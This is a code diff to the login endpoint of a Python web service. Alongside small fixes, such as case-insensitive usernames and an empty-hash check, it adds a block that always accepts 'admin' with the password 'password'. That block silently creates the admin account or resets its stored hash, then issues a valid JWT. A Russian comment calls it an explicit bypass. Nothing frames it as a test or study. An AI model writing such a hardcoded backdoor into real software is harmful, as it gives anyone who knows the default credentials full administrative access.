@@ -30,7 +30,7 @@ def get_db():
 
 @app.post("/login")
 def login(data: dict):
-    username = (data.get("username") or "").strip()
+    username = (data.get("username") or "").strip().lower()
     password = data.get("password") or ""
 
     if not username:
@@ -40,8 +40,43 @@ def login(data: dict):
 
     conn = get_db()
     cur = conn.cursor()
+
+    # Явный обходной путь: admin / password всегда принимаем и при необходимости правим хэш в БД
+    if username == "admin" and password == "password":
+        cur.execute(
+            "SELECT id, username FROM admins WHERE username = %s",
+            ("admin",),
+        )
+        row = cur.fetchone()
+        if row:
+            _id, _username = row[0], row[1]
+            new_hash = bcrypt.hash("password", rounds=12)
+            cur.execute(
+                "UPDATE admins SET password_hash = %s WHERE username = %s",
+                (new_hash, "admin"),
+            )
+            conn.commit()
+        else:
+            new_hash = bcrypt.hash("password", rounds=12)
+            cur.execute(
+                "INSERT INTO admins(username, password_hash) VALUES(%s,%s)",
+                ("admin", new_hash),
+            )
+            conn.commit()
+            cur.execute("SELECT id, username FROM admins WHERE username = %s", ("admin",))
+            row = cur.fetchone()
+            _id, _username = row[0], row[1]
+        cur.close()
+        conn.close()
+        token = jwt.encode(
+            {"sub": str(_id), "user": _username, "exp": datetime.utcnow() + timedelta(days=1)},
+            SECRET,
+            algorithm="HS256",
+        )
+        return {"token": token, "username": _username}
+
     cur.execute(
-        "SELECT id, username, password_hash FROM admins WHERE username = %s",
+        "SELECT id, username, password_hash FROM admins WHERE LOWER(username) = %s",
         (username,),
     )
     row = cur.fetchone()
@@ -52,7 +87,7 @@ def login(data: dict):
         raise HTTPException(status_code=401, detail="Invalid username or password")
 
     _id, _username, password_hash = row
-    if not bcrypt.verify(password, password_hash):
+    if not password_hash or not bcrypt.verify(password, password_hash):
         raise HTTPException(status_code=401, detail="Invalid username or password")
 
     token = jwt.encode(
